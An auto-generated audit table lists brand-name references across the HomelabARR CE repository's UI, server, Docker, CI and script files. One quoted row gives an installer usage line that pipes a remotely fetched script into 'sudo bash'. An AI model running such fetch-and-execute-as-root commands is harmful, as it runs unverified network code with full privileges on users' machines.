# White-Label Audit (auto-generated)

> **Generated:** 2026-06-25 18:14 UTC · **Source:** `scripts/generate-whitelabel-audit.sh`
>
> This file is regenerated automatically on every push to `main`.
> Do not edit by hand — your changes will be overwritten. See the companion
> [White-Label & Forking guide](white-label.md) for the narrative walkthrough.

**Total brand references found:** 1365

---

## User-facing UI (`src/`, `index.html`)

**17 references**

| File | Line | Match |
| ---- | ---- | ----- |
| `index.html` | 9 | `    <link rel="canonical" href="https://ce-demo.homelabarr.com/">` |
| `index.html` | 14 | `    <meta property="og:url" content="https://ce-demo.homelabarr.com/">` |
| `src/App.tsx` | 536 | `              const isEnhancedMount = app.name.includes('homelabarr-mount-enhanced') \|\|` |
| `src/App.tsx` | 893 | `            <a href="https://wiki.homelabarr.com" target="_blank" rel="noopener noreferrer" className="hover:text-foregr` |
| `src/App.tsx` | 894 | `            <a href="https://discord.gg/Pc7mXX786x" target="_blank" rel="noopener noreferrer" className="hover:text-fore` |
| `src/App.tsx` | 895 | `            <a href="https://github.com/imogenlabs/homelabarr-ce" target="_blank" rel="noopener noreferrer" className="h` |
| `src/components/EnhancedMountOnboarding.tsx` | 40 | `      helpUrl: 'https://docs.homelabarr.com/installation/traefik'` |
| `src/components/EnhancedMountOnboarding.tsx` | 48 | `      helpUrl: 'https://docs.homelabarr.com/installation/authelia'` |
| `src/components/EnhancedMountOnboarding.tsx` | 56 | `      helpUrl: 'https://docs.homelabarr.com/setup/domain'` |
| `src/components/HelpModal.tsx` | 107 | `                  { label: "Wiki & Docs", href: "https://wiki.homelabarr.com", desc: "Full documentation" },` |
| `src/components/HelpModal.tsx` | 108 | `                  { label: "GitHub", href: "https://github.com/imogenlabs/homelabarr-ce", desc: "Source code & issues" }` |
| `src/components/HelpModal.tsx` | 109 | `                  { label: "Discord Community", href: "https://discord.gg/Pc7mXX786x", desc: "Get help & chat" },` |
| `src/components/HelpModal.tsx` | 110 | `                  { label: "Reddit", href: "https://reddit.com/r/homelabarr", desc: "r/homelabarr" },` |
| `src/data/app-metadata.ts` | 198 | `  'homelabarr-uploader': Zap,` |
| `src/data/app-metadata.ts` | 199 | `  'homelabarr-web-interface': LayoutDashboard,` |
| `src/main.tsx` | 13 | `  ['homelabarr_token', 'homelabarr_user', 'homelabarr_jwt'].forEach(k => localStorage.removeItem(k));` |
| `src/utils/iconMap.ts` | 14 | `const availableIcons = new Set(["alltube", "amd", "aria", "autoscan", "backup", "bazarr", "bazarr4k", "bitwarden", "cali` |

## Backend & server (`server/`, `docker-entrypoint.sh`)

**22 references**

| File | Line | Match |
| ---- | ---- | ----- |
| `server/alert.js` | 52 | `  const body = JSON.stringify({ ...safe, source: 'homelabarr-ce', ts: new Date().toISOString() });` |
| `server/alert.test.js` | 57 | `    expect(body).toMatchObject({ event: 'login.locked', actor: 'bob', ip: '1.2.3.4', reason: 'too many', source: 'homela` |
| `server/auth.js` | 35 | `  return Buffer.from(hkdfSync('sha256', current, Buffer.alloc(0), 'homelabarr-api-key-hmac/v1', 32)).toString('hex');` |
| `server/auth.js` | 54 | `  email: 'admin@homelabarr.local',` |
| `server/auth.js` | 138 | `const DUMMY_PASSWORD_HASH = bcrypt.hashSync('homelabarr-timing-equalizer', BCRYPT_COST);` |
| `server/cli-bridge.js` | 801 | `      ARIA_RPC_SECRET: 'homelabarr',` |
| `server/db.js` | 5 | `const DB_PATH = process.env.DB_PATH \|\| path.join(process.env.DATA_DIR \|\| path.join(process.cwd(), 'data'), 'homelaba` |
| `server/email.test.js` | 33 | `      from: 'noreply@homelabarr.com',` |
| `server/log.js` | 31 | `  defaultMeta: { service: 'homelabarr-backend' },` |
| `server/mfa.test.js` | 49 | `    const totp = mfa.newTotp('alice@homelabarr');` |
| `server/mfa.test.js` | 62 | `    const totp = mfa.newTotp('alice@homelabarr');` |
| `server/mfa.test.js` | 64 | `    expect(totp.label).toBe('alice@homelabarr');` |
| `server/network-manager.js` | 138 | `                'sqlite://./data/homelabarr.db',` |
| `server/network-manager.js` | 160 | `      serviceUrls.database = process.env.DATABASE_URL \|\| 'sqlite:///app/data/homelabarr.db';` |
| `server/progress-stream.test.js` | 114 | `      .mockReturnValue({ corsOrigin: ['https://ce-demo.homelabarr.com'] });` |
| `server/progress-stream.test.js` | 118 | `    mgr.addClient('ok', ok, fakeReq({ origin: 'https://ce-demo.homelabarr.com' }));` |
| `server/progress-stream.test.js` | 119 | `    expect(ok.headers['Access-Control-Allow-Origin']).toBe('https://ce-demo.homelabarr.com');` |
| `server/routes/auth-admin.js` | 67 | `        from: process.env.SMTP_FROM \|\| 'homelabarr@localhost',` |
| `server/routes/dangerous-ops.routes.test.js` | 347 | `    expect(nameArg).toMatch(/^homelabarr-it-tools-\d+$/);` |
| `server/routes/dangerous-ops.routes.test.js` | 361 | `    expect(res.body.containerName).toMatch(/^homelabarr-it-tools-\d+$/);` |
| `server/routes/deploy.js` | 48 | `          const containerName = 'homelabarr-${appId}-${Date.now()}';` |
| `server/start.sh` | 63 | `# Fix ownership if running as homelabarr but files are root-owned (bind mount)` |

## Docker (`Dockerfile*`, `homelabarr.yml`)

**59 references**

| File | Line | Match |
| ---- | ---- | ----- |
| `Dockerfile` | 15 | `    addgroup -g 1001 homelabarr && \` |
| `Dockerfile` | 16 | `    adduser -u 1001 -G homelabarr -s /bin/sh -D homelabarr && \` |
| `Dockerfile` | 17 | `    chown -R homelabarr:homelabarr /var/cache/nginx /var/log/nginx /etc/nginx/conf.d && \` |
| `Dockerfile` | 18 | `    touch /var/run/nginx.pid && chown homelabarr:homelabarr /var/run/nginx.pid` |
| `Dockerfile` | 21 | `COPY --chown=homelabarr:homelabarr public/icons /usr/share/nginx/html/icons` |
| `Dockerfile` | 22 | `COPY --chown=homelabarr:homelabarr public/mascot.webp /usr/share/nginx/html/mascot.webp` |
| `Dockerfile` | 23 | `COPY --chown=homelabarr:homelabarr public/mascot-2x.webp /usr/share/nginx/html/mascot-2x.webp` |
| `Dockerfile` | 24 | `COPY --chown=homelabarr:homelabarr nginx.conf.template /etc/nginx/templates/nginx.conf.template` |
| `Dockerfile` | 25 | `COPY --chown=homelabarr:homelabarr docker-entrypoint.sh /docker-entrypoint.sh` |
| `Dockerfile` | 33 | `LABEL org.opencontainers.image.title="homelabarr-ce-frontend"` |
| `Dockerfile` | 35 | `LABEL org.opencontainers.image.url="https://ce-demo.homelabarr.com"` |
| `Dockerfile` | 36 | `LABEL org.opencontainers.image.source="https://github.com/imogenlabs/homelabarr-ce"` |
| `Dockerfile` | 37 | `LABEL org.opencontainers.image.documentation="https://github.com/imogenlabs/homelabarr-ce/blob/main/README.md"` |
| `Dockerfile` | 40 | `LABEL io.homelabarr.security.contact="https://github.com/imogenlabs/homelabarr-ce/security/policy"` |
| `Dockerfile` | 42 | `USER homelabarr` |
| `Dockerfile.backend` | 33 | `# Create homelabarr user` |
| `Dockerfile.backend` | 34 | `RUN addgroup -g 1001 homelabarr && \` |
| `Dockerfile.backend` | 35 | `    adduser -u 1001 -G homelabarr -s /bin/bash -D homelabarr` |
| `Dockerfile.backend` | 55 | `RUN mkdir -p /homelabarr` |
| `Dockerfile.backend` | 67 | `    /var/log/homelabarr && \` |
| `Dockerfile.backend` | 68 | `    chown -R homelabarr:homelabarr \` |
| `Dockerfile.backend` | 70 | `    /homelabarr \` |
| `Dockerfile.backend` | 71 | `    /var/log/homelabarr` |
| `Dockerfile.backend` | 82 | `# Switch to homelabarr user` |
| `Dockerfile.backend` | 83 | `USER homelabarr` |
| `Dockerfile.backend` | 93 | `LABEL org.opencontainers.image.title="homelabarr-ce-backend"` |
| `Dockerfile.backend` | 95 | `LABEL org.opencontainers.image.url="https://ce-demo.homelabarr.com"` |
| `Dockerfile.backend` | 96 | `LABEL org.opencontainers.image.source="https://github.com/imogenlabs/homelabarr-ce"` |
| `Dockerfile.backend` | 97 | `LABEL org.opencontainers.image.documentation="https://github.com/imogenlabs/homelabarr-ce/blob/main/README.md"` |
| `Dockerfile.backend` | 100 | `LABEL io.homelabarr.security.contact="https://github.com/imogenlabs/homelabarr-ce/security/policy"` |
| `homelabarr.yml` | 5 | `#   CORS_ORIGIN     — your public domain (e.g., https://homelabarr.example.com)` |
| `homelabarr.yml` | 8 | `#   CLI_BRIDGE_HOST_PATH  — path to your HomelabARR CLI installation (default: /opt/homelabarr)` |
| `homelabarr.yml` | 12 | `#   docker compose -f homelabarr.yml up -d` |
| `homelabarr.yml` | 37 | `    container_name: homelabarr-socket-proxy` |
| `homelabarr.yml` | 78 | `      - homelabarr-internal` |
| `homelabarr.yml` | 89 | `    image: ghcr.io/imogenlabs/homelabarr-frontend:latest` |
| `homelabarr.yml` | 90 | `    container_name: homelabarr-frontend` |
| `homelabarr.yml` | 99 | `      - homelabarr` |
| `homelabarr.yml` | 103 | `      - apparmor=homelabarr-frontend` |
| `homelabarr.yml` | 123 | `    image: ghcr.io/imogenlabs/homelabarr-backend:latest` |
| `homelabarr.yml` | 124 | `    container_name: homelabarr-backend` |
| `homelabarr.yml` | 133 | `      - CLI_BRIDGE_PATH=/homelabarr` |
| `homelabarr.yml` | 147 | `      - ${CLI_BRIDGE_HOST_PATH:-/opt/homelabarr}:/homelabarr:ro` |
| `homelabarr.yml` | 148 | `      - homelabarr-data:/app/data` |
| `homelabarr.yml` | 149 | `      - homelabarr-config:/app/server/config` |
| `homelabarr.yml` | 150 | `      - homelabarr-activity:/app/server/activity-data` |
| `homelabarr.yml` | 152 | `      - homelabarr` |
| `homelabarr.yml` | 153 | `      - homelabarr-internal` |
| `homelabarr.yml` | 157 | `      - apparmor=homelabarr-backend` |
| `homelabarr.yml` | 183 | `  homelabarr:` |
| `homelabarr.yml` | 184 | `    name: homelabarr` |
| `homelabarr.yml` | 186 | `  homelabarr-internal:` |
| `homelabarr.yml` | 187 | `    name: homelabarr-internal` |
| `homelabarr.yml` | 192 | `  homelabarr-data:` |
| `homelabarr.yml` | 193 | `    name: homelabarr-data` |
| `homelabarr.yml` | 195 | `  homelabarr-config:` |
| `homelabarr.yml` | 196 | `    name: homelabarr-config` |
| `homelabarr.yml` | 198 | `  homelabarr-activity:` |
| `homelabarr.yml` | 199 | `    name: homelabarr-activity` |

## CI/CD workflows (`.github/workflows/`)

**29 references**

| File | Line | Match |
| ---- | ---- | ----- |
| `.github/workflows/compliance-binder.yml` | 33 | `          EVIDENCE_HOST: 'ce-demo.homelabarr.com'` |
| `.github/workflows/compliance-evidence.yml` | 25 | `          EVIDENCE_HOST: ce-demo.homelabarr.com` |
| `.github/workflows/dast-active.yml` | 22 | `  ZAP_TARGET: ${{ inputs.target \|\| 'https://ce-demo.homelabarr.com' }}` |
| `.github/workflows/dast-baseline.yml` | 28 | `          target: 'https://ce-demo.homelabarr.com'` |
| `.github/workflows/dependency-staleness.yml` | 96 | `                  body: '**Staleness alert:** This ${b.cls} dependency PR has been open ${b.ageDays} days. ${b.status} p` |
| `.github/workflows/deploy-drift.yml` | 19 | `            const LIVE_URL = 'https://ce-demo.homelabarr.com/';` |
| `.github/workflows/docker-build-push.yml` | 20 | `  FRONTEND_IMAGE_NAME: homelabarr-frontend` |
| `.github/workflows/docker-build-push.yml` | 21 | `  BACKEND_IMAGE_NAME: homelabarr-backend` |
| `.github/workflows/docker-build-push.yml` | 153 | `          --certificate-identity-regexp 'https://github.com/imogenlabs/homelabarr-ce/.github/workflows/' \` |
| `.github/workflows/docker-build-push.yml` | 161 | `          --certificate-identity-regexp 'https://github.com/imogenlabs/homelabarr-ce/.github/workflows/' \` |
| `.github/workflows/docker-build-push.yml` | 221 | `        # Update homelabarr.yml with latest image tags` |
| `.github/workflows/docker-build-push.yml` | 222 | `        sed -i 's\|ghcr.io/.*/homelabarr-frontend:.*\|${{ env.REGISTRY }}/${{ env.NAMESPACE }}/${{ env.FRONTEND_IMAGE_NA` |
| `.github/workflows/docker-build-push.yml` | 223 | `        sed -i 's\|ghcr.io/.*/homelabarr-backend:.*\|${{ env.REGISTRY }}/${{ env.NAMESPACE }}/${{ env.BACKEND_IMAGE_NAME` |
| `.github/workflows/docker-build-push.yml` | 246 | `        echo "curl -o homelabarr.yml https://raw.githubusercontent.com/${{ github.repository }}/main/homelabarr.yml" >> ` |
| `.github/workflows/docker-build-push.yml` | 249 | `        echo "export CLI_BRIDGE_HOST_PATH=/path/to/your/homelabarr-cli" >> $GITHUB_STEP_SUMMARY` |
| `.github/workflows/docker-build-push.yml` | 256 | `        echo "docker-compose -f homelabarr.yml up -d" >> $GITHUB_STEP_SUMMARY` |
| `.github/workflows/docker-build-push.yml` | 273 | `        payload="{\"embeds\":[{\"title\":\"HomelabARR CE $TAG Released\",\"author\":{\"name\":\"Imogen Labs\"},\"color\"` |
| `.github/workflows/e2e-tests.yml` | 87 | `          TEST_BASE_URL: https://ce-dev.homelabarr.com` |
| `.github/workflows/pages.yml` | 22 | `    # MUST be hosted: homelabarr-ce is a PUBLIC repo, and GitHub blocks public` |
| `.github/workflows/pentest.yml` | 14 | `        default: 'https://ce-demo.homelabarr.com'` |
| `.github/workflows/pentest.yml` | 32 | `          ART_TARGET: ${{ github.event.inputs.target \|\| 'https://ce-demo.homelabarr.com' }}` |
| `.github/workflows/security-audit.yml` | 288 | `          ghcr.io/imogenlabs/homelabarr-frontend:latest` |
| `.github/workflows/security-audit.yml` | 289 | `          ghcr.io/imogenlabs/homelabarr-backend:latest` |
| `.github/workflows/security-audit.yml` | 390 | `        if: always() && hashFiles('trivy-results/trivy-ghcr.io_imogenlabs_homelabarr-frontend_latest.sarif') != ''` |
| `.github/workflows/security-audit.yml` | 392 | `          sarif_file: 'trivy-results/trivy-ghcr.io_imogenlabs_homelabarr-frontend_latest.sarif'` |
| `.github/workflows/security-audit.yml` | 393 | `          category: 'trivy-homelabarr-frontend'` |
| `.github/workflows/security-audit.yml` | 397 | `        if: always() && hashFiles('trivy-results/trivy-ghcr.io_imogenlabs_homelabarr-backend_latest.sarif') != ''` |
| `.github/workflows/security-audit.yml` | 399 | `          sarif_file: 'trivy-results/trivy-ghcr.io_imogenlabs_homelabarr-backend_latest.sarif'` |
| `.github/workflows/security-audit.yml` | 400 | `          category: 'trivy-homelabarr-backend'` |

## Config files (`package.json`, `CNAME`, `.env.example`, `nginx.conf.template`)

**4 references**

| File | Line | Match |
| ---- | ---- | ----- |
| `.env.example` | 32 | `# If you cloned to /opt/homelabarr (recommended), leave this as-is.` |
| `.env.example` | 33 | `CLI_BRIDGE_HOST_PATH=/opt/homelabarr` |
| `CNAME` | 1 | `wiki.homelabarr.com` |
| `package.json` | 2 | `  "name": "homelabarr",` |

## Install & utility scripts

**59 references**

| File | Line | Match |
| ---- | ---- | ----- |
| `install-remote.sh` | 4 | `# Usage: sudo wget -qO- https://raw.githubusercontent.com/imogenlabs/homelabarr-ce/main/install-remote.sh \| sudo bash` |
| `install-remote.sh` | 9 | `REPO="https://github.com/imogenlabs/homelabarr-ce.git"` |
| `install-remote.sh` | 10 | `INSTALL_DIR="/opt/homelabarr"` |
| `install-remote.sh` | 11 | `BIN_NAME="homelabarr-cli"` |
| `install-remote.sh` | 69 | `echo "    Run the installer:  sudo homelabarr-cli -i"` |
| `install-remote.sh` | 72 | `echo "    Wiki: https://wiki.homelabarr.com/"` |
| `install-remote.sh` | 73 | `echo "    Discord: https://discord.gg/Pc7mXX786x"` |
| `preinstall/README.md` | 26 | `Image: ghcr.io/imogenlabs/homelabarr-cli/docker-local-persist:latest` |
| `preinstall/README.md` | 71 | `cd /path/to/homelabarr-cli` |
| `preinstall/installer/subinstall/lxc.sh` | 16 | `  if [[ ! -f "/home/.lxcstart.sh" ]]; then $(command -v rsync) -aqhv /opt/homelabarr/preinstall/installer/subinstall/lxc` |
| `preinstall/installer/subinstall/lxc.sh` | 20 | `    $(command -v ansible-playbook) /opt/homelabarr/preinstall/installer/subinstall/lxc.yml 1>/dev/null 2>&1` |
| `preinstall/installer/subinstall/lxc.sh` | 23 | `  if [[ -f "/home/.lxcstart.sh" ]]; then $(command -v ansible-playbook) /opt/homelabarr/preinstall/installer/subinstall/` |
| `preinstall/installer/ubuntu.sh` | 57 | `mkdir -p /opt/homelabarr` |
| `preinstall/installer/ubuntu.sh` | 61 | `chown -R 1000:1000 /opt/homelabarr` |
| `preinstall/templates/local/gpu.sh` | 5 | `# Docker owned homelabarr-cli                 #` |
| `preinstall/templates/local/gpu.sh` | 6 | `# Docker Maintainer homelabarr-cli            #` |
| `preinstall/templates/local/gpu.sh` | 9 | `# Author(s):  homelabarr-cli                  #` |
| `scripts/backup-cron.sh` | 15 | `  rsync -av "$BACKUP_LOCAL/homelabarr.$STAMP.db" "$BACKUP_REMOTE/" 2>/dev/null \|\| true` |
| `scripts/backup.sh` | 12 | `OUT="${LOCAL_DIR}/homelabarr-${TS}.tar"` |
| `scripts/backup.sh` | 17 | `docker cp "homelabarr-backend:/app/data/homelabarr.db" "${LOCAL_DIR}/homelabarr.${TS}.db"` |
| `scripts/backup.sh` | 29 | `      --output "${LOCAL_DIR}/homelabarr.${TS}.db.gpg" "${LOCAL_DIR}/homelabarr.${TS}.db"` |
| `scripts/backup.sh` | 30 | `  rm -f "${LOCAL_DIR}/homelabarr.${TS}.db"` |
| `scripts/backup.sh` | 33 | `  sha256sum "${LOCAL_DIR}/homelabarr.${TS}.db.gpg" > "${LOCAL_DIR}/homelabarr.${TS}.db.gpg.sha256"` |
| `scripts/backup.sh` | 35 | `      "${LOCAL_DIR}/homelabarr.${TS}.db.gpg.sha256" 2>/dev/null \|\| true` |
| `scripts/backup.sh` | 36 | `  BACKUP_FILE="${LOCAL_DIR}/homelabarr.${TS}.db.gpg"` |
| `scripts/backup.sh` | 38 | `  BACKUP_FILE="${LOCAL_DIR}/homelabarr.${TS}.db"` |
| `scripts/backup.sh` | 49 | `find "$LOCAL_DIR" -name 'homelabarr-*' -mtime +14 -delete 2>/dev/null \|\| true` |
| `scripts/bump-image-digests.sh` | 4 | `for img in homelabarr-frontend homelabarr-backend; do` |
| `scripts/bump-image-digests.sh` | 8 | `    homelabarr.yml` |
| `scripts/bump-image-digests.sh` | 10 | `rm -f homelabarr.yml.bak` |
| `scripts/bump-image-digests.sh` | 12 | `echo "Verify with: cosign verify --certificate-identity-regexp '^https://github.com/imogenlabs/homelabarr-ce/' --certifi` |
| `scripts/detect-lxc-storage.sh` | 214 | `        echo "   • Edit: /opt/homelabarr/config/storage-override.json"` |
| `scripts/detect-lxc-storage.sh` | 234 | `    local CONFIG_DIR="/opt/homelabarr/config"` |
| `scripts/encrypt-db.sh` | 3 | `DB_PATH="${1:?usage: $0 <path/to/homelabarr.db>}"` |
| `scripts/fix-storage-detection.sh` | 14 | `CONFIG_DIR="/opt/homelabarr/config"` |
| `scripts/fix-storage-detection.sh` | 151 | `echo "  3. Check logs: docker logs homelabarr-api"` |
| `scripts/install-apparmor.sh` | 8 | `cat >/etc/apparmor.d/homelabarr-backend <<'EOF'` |
| `scripts/install-apparmor.sh` | 10 | `profile homelabarr-backend flags=(attach_disconnected,mediate_deleted) {` |
| `scripts/install-apparmor.sh` | 31 | `apparmor_parser -r /etc/apparmor.d/homelabarr-backend` |
| `scripts/install-apparmor.sh` | 32 | `aa-status \| grep homelabarr-backend \|\| echo "Profile loaded"` |
| `scripts/install-apparmor.sh` | 33 | `echo "AppArmor profile installed: homelabarr-backend"` |
| `scripts/install-apparmor.sh` | 36 | `aa-enforce /etc/apparmor.d/homelabarr-backend` |
| `scripts/install-apparmor.sh` | 37 | `aa-enforce /etc/apparmor.d/homelabarr-frontend 2>/dev/null \|\| true` |
| `scripts/install-apparmor.sh` | 40 | `if ! aa-status 2>/dev/null \| grep -E 'homelabarr-(backend\|frontend)' \| grep -q 'enforce'; then` |
| `scripts/install-apparmor.sh` | 43 | `echo 'AppArmor: homelabarr profiles configured'` |
| `scripts/intelligent-storage-detection.sh` | 383 | `    local CONFIG_DIR="/opt/homelabarr/config"` |
| `scripts/restore-drill.sh` | 7 | `LATEST_DB="$(ls -1t "$BACKUP_DIR"/homelabarr.*.db 2>/dev/null \| head -1)"` |
| `scripts/test/test-ecosystem.sh` | 174 | `    # Test homelabarr network` |
| `scripts/test/test-ecosystem.sh` | 175 | `    if docker network inspect homelabarr > /dev/null 2>&1; then` |
| `scripts/test/test-ecosystem.sh` | 182 | `    if docker ps --filter "name=homelabarr_backend" --format "{{.Names}}" \| grep -q "homelabarr_backend"; then` |
| `scripts/test/test-ecosystem.sh` | 183 | `        test_service_connectivity "homelabarr_backend" "mount-enhanced" "8080"` |
| `scripts/test/test-ecosystem.sh` | 184 | `        test_service_connectivity "homelabarr_backend" "homelabarr-uploader" "9999"` |
| `scripts/test/test-ecosystem.sh` | 197 | `    if docker ps --filter "name=homelabarr_backend" --format "{{.Ports}}" \| grep -q "8092"; then` |
| `scripts/test/test-ecosystem.sh` | 228 | `        "/opt/appdata/homelabarr"` |
| `scripts/test/test-ecosystem.sh` | 269 | `        "apps/system/homelabarr-uploader.yml"` |
| `scripts/test/test-ecosystem.sh` | 270 | `        "apps/system/homelabarr-web-interface.yml"` |
| `scripts/test/test-ecosystem.sh` | 327 | `        "homelabarr_backend_data:/opt/appdata/homelabarr/backend/data"` |
| `scripts/test/test-ecosystem.sh` | 367 | `            echo "  • Web Interface: https://homelabarr.$domain"` |
| `scripts/validate-templates.sh` | 15 | `RESULTS_DIR="/tmp/homelabarr-validate"` |

## Root documentation

**103 references**

| File | Line | Match |
| ---- | ---- | ----- |
| `CHANGELOG.md` | 6 | `- **React 18 → 19**: upgraded 'react', 'react-dom', '@types/react', '@types/react-dom' to 19.2.7 (matched majors). Res` |
| `CHANGELOG.md` | 7 | `- **shadcn/ui modernization**: converted all 83 'React.forwardRef' wrappers across 16 'src/components/ui/*' components t` |
| `CHANGELOG.md` | 8 | `- **lucide-react 0.344 → 1.21**: required for React 19 peer support (the old range hard-blocked installs). Brand icons` |
| `CHANGELOG.md` | 10 | `- **Other deps**: 'dockerode' 4 → 5, 'better-sqlite3' 12.11.1, 'nodemailer' 8 → 9, '@types/node' 26, dev-tools group` |
| `CHANGELOG.md` | 14 | `- **Automated test foundation + Wave 1** (Epic [HLCE-209](https://mjashley.atlassian.net/browse/HLCE-209), [#294](https:` |
| `CHANGELOG.md` | 16 | `- **Auth core tests** (Epic [HLCE-209](https://mjashley.atlassian.net/browse/HLCE-209), HLCE-212, [#296](https://github.` |
| `CHANGELOG.md` | 17 | `- **MFA tests** (Epic [HLCE-209](https://mjashley.atlassian.net/browse/HLCE-209), HLCE-214, [#297](https://github.com/im` |
| `CHANGELOG.md` | 18 | `- **Rate-limit & lockout tests** (Epic [HLCE-209](https://mjashley.atlassian.net/browse/HLCE-209), HLCE-215, [#299](http` |
| `CHANGELOG.md` | 19 | `- **Auth HTTP route integration tests** (Epic [HLCE-209](https://mjashley.atlassian.net/browse/HLCE-209), HLCE-216, [#30` |
| `CHANGELOG.md` | 20 | `- **Persistence-integrity tests** (Epic [HLCE-209](https://mjashley.atlassian.net/browse/HLCE-209), HLCE-221, [#301](htt` |
| `CHANGELOG.md` | 21 | `- **Audit hash-chain + secure-logging tests** (Epic [HLCE-209](https://mjashley.atlassian.net/browse/HLCE-209), HLCE-217` |
| `CHANGELOG.md` | 22 | `- **Docker connection-manager tests** (Epic [HLCE-209](https://mjashley.atlassian.net/browse/HLCE-209), HLCE-219, [#304]` |
| `CHANGELOG.md` | 23 | `- **Deploy/SSE + startup-guard + network tests** (Epic [HLCE-209](https://mjashley.atlassian.net/browse/HLCE-209), HLCE-` |
| `CHANGELOG.md` | 24 | `- **High-value component tests (RTL)** (Epic [HLCE-209](https://mjashley.atlassian.net/browse/HLCE-209), HLCE-225, [#307` |
| `CHANGELOG.md` | 25 | `- **React contexts & hooks tests** (Epic [HLCE-209](https://mjashley.atlassian.net/browse/HLCE-209), HLCE-223, [#306](ht` |
| `CHANGELOG.md` | 26 | `- **Bug-lock regression suite — 3 latent bugs fixed** (Epic [HLCE-209](https://mjashley.atlassian.net/browse/HLCE-209)` |
| `CHANGELOG.md` | 27 | `- **Security-invariant regression suite — permanent guardrails** (Epic [HLCE-209](https://mjashley.atlassian.net/brows` |
| `CHANGELOG.md` | 28 | `- **Dangerous-operation integration tests** (Epic [HLCE-209](https://mjashley.atlassian.net/browse/HLCE-209), HLCE-229, ` |
| `CHANGELOG.md` | 29 | `- **react-hooks v7 architectural rules enforced as errors** (Epic [HLCE-209](https://mjashley.atlassian.net/browse/HLCE-` |
| `CHANGELOG.md` | 30 | `- **Playwright E2E: seeded container target + critical-journey suite** (Epic [HLCE-209](https://mjashley.atlassian.net/b` |
| `CHANGELOG.md` | 31 | `- **Mutation-testing harness (StrykerJS) + scoped baseline** (Epic [HLCE-261](https://mjashley.atlassian.net/browse/HLCE` |
| `CHANGELOG.md` | 32 | `- **Untested-route integration tests + a surfaced Router() bug fixed** (Epic [HLCE-270](https://mjashley.atlassian.net/b` |
| `CHANGELOG.md` | 33 | `- **Frontend security-component tests + lib/api gap-fills + a password-policy fix** (Epic [HLCE-270](https://mjashley.at` |
| `CHANGELOG.md` | 34 | `- **Deploy-execution + remaining backend-branch coverage; dead-code removal** (Epic [HLCE-270](https://mjashley.atlassia` |
| `CHANGELOG.md` | 35 | `- **E2E round 2 — failure / permission / account journeys + hardened assertions** (Epic [HLCE-270](https://mjashley.at` |
| `CHANGELOG.md` | 39 | `- **Nightly mutation-testing CI + per-module score ratchet** (Epic [HLCE-261](https://mjashley.atlassian.net/browse/HLCE` |
| `CHANGELOG.md` | 40 | `- **Mutation pass on the high-risk security core** (Epic [HLCE-261](https://mjashley.atlassian.net/browse/HLCE-261), HLC` |
| `CHANGELOG.md` | 41 | `- **Fix: 'GET /containers?stats=true' no longer blocks the event loop** (HLCE-275, [#331](https://github.com/imogenlabs/` |
| `CHANGELOG.md` | 43 | `- **Fix deploy endpoint 404 — deploy-from-UI was unreachable in production** (Epic [HLCE-209](https://mjashley.atlassi` |
| `CHANGELOG.md` | 46 | `- **Docker health now reflects a real probe instead of always reporting healthy** (Epic [HLCE-209](https://mjashley.atla` |
| `CHANGELOG.md` | 47 | `- **Audit hash chain now detects boundary-ambiguous tampering** (Epic [HLCE-209](https://mjashley.atlassian.net/browse/H` |
| `CHANGELOG.md` | 48 | `- **Login limiter no longer counts successful logins** (Epic [HLCE-209](https://mjashley.atlassian.net/browse/HLCE-209),` |
| `CHANGELOG.md` | 49 | `- **SSE broadcast no longer skips a client after a failing one** (Epic [HLCE-209](https://mjashley.atlassian.net/browse/` |
| `CHANGELOG.md` | 52 | `- **Audit chain tip gets an out-of-band signed anchor** (Epic [HLCE-286](https://mjashley.atlassian.net/browse/HLCE-286)` |
| `CHANGELOG.md` | 53 | `- **'POST /deploy' outer catch is unreachable — dead status branches removed** (Epic [HLCE-286](https://mjashley.atlas` |
| `CHANGELOG.md` | 54 | `- **Adversarial-review remediation: validation, CORS, auth, and Docker-manager hardening** (Epic [HLCE-279](https://mjas` |
| `CHANGELOG.md` | 68 | `- **Container delete/stop/restart**: Docker client was never passed to the CLI manager. All container operations now wor` |
| `CHANGELOG.md` | 69 | `- **Docker socket permissions**: Apps that mount 'docker.sock' (Portainer, etc.) now get 'group_add' injected at deploy ` |
| `CHANGELOG.md` | 70 | `- **Read-only template volumes**: Temp deploy YAMLs now write to 'server/data/' instead of next to the source YAML, so d` |
| `CHANGELOG.md` | 71 | `- **Deploy progress stream**: SSE 'connected' event now includes the server-assigned 'clientId', fixing "Client not foun` |
| `CHANGELOG.md` | 74 | `- **npm vulnerabilities patched**: vite, hono, @hono/node-server bumped to address 9 advisories (3 high, 6 moderate). ([` |
| `CHANGELOG.md` | 75 | `- **Workflow permissions**: Added explicit 'permissions: contents: read' to all workflows missing it. Resolves CodeQL al` |
| `CHANGELOG.md` | 78 | `- **Wiki cleanup**: Removed Professional Edition section; replaced placeholder octopus with optimized v3b WebP at proper` |
| `CONTRIBUTING.md` | 9 | `1. **Ideas start in Discord** — Drop suggestions in [#feature-requests](https://discord.gg/Pc7mXX786x) or open a [GitH` |
| `CONTRIBUTING.md` | 19 | `\| 'main' \| Production — stable, released \| [ce-demo.homelabarr.com](https://ce-demo.homelabarr.com) \| Safe to run ` |
| `CONTRIBUTING.md` | 20 | `\| 'staging' \| Release candidate — 1 week community soak \| [ce-staging.homelabarr.com](https://ce-staging.homelabarr` |
| `CONTRIBUTING.md` | 21 | `\| 'dev' \| Active development — proposed changes \| [ce-dev.homelabarr.com](https://ce-dev.homelabarr.com) \| May bre` |
| `CONTRIBUTING.md` | 59 | `- Open a [GitHub Issue](https://github.com/imogenlabs/homelabarr-ce/issues)` |
| `CONTRIBUTING.md` | 60 | `- Or drop it in [#help](https://discord.gg/Pc7mXX786x) on Discord` |
| `CONTRIBUTING.md` | 65 | `- **Discord**: [discord.gg/Pc7mXX786x](https://discord.gg/Pc7mXX786x)` |
| `CONTRIBUTING.md` | 66 | `- **Reddit**: [r/homelabarr](https://reddit.com/r/homelabarr)` |
| `CONTRIBUTING.md` | 67 | `- **Ko-fi**: [ko-fi.com/homelabarr](https://ko-fi.com/homelabarr)` |
| `CONTRIBUTING.md` | 68 | `- **Discussions**: [GitHub Discussions](https://github.com/imogenlabs/homelabarr-ce/discussions)` |
| `README.md` | 4 | `    <a href="https://github.com/imogenlabs/homelabarr-ce">` |
| `README.md` | 12 | `    <a href="https://github.com/imogenlabs/homelabarr-ce/releases/latest">` |
| `README.md` | 13 | `        <img src="https://img.shields.io/github/v/release/imogenlabs/homelabarr-ce?label=Release&logo=github" alt="Relea` |
| `README.md` | 15 | `    <a href="https://github.com/imogenlabs/homelabarr-ce/blob/main/LICENSE">` |
| `README.md` | 18 | `    <a href="https://discord.gg/Pc7mXX786x">` |
